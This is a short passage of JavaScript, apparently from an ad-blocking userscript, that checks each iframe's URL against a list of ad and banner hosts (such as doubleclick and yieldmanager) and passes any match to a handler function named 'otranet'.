		else if(iframe.match("pubads.g.doubleclick.net/gampad/ads?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("cuevana.tv/banners/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("images.mcanime.net/manga/"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("ads.creanis.com"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://yieldmanager.adbooth.net/st?"))
			{
			otranet(iframes[i])
		}
		else if(iframe.match("^http://ad2.adnetwork.net/st?"))
			{
			otranet(iframes[i])
		}
	}
	

}
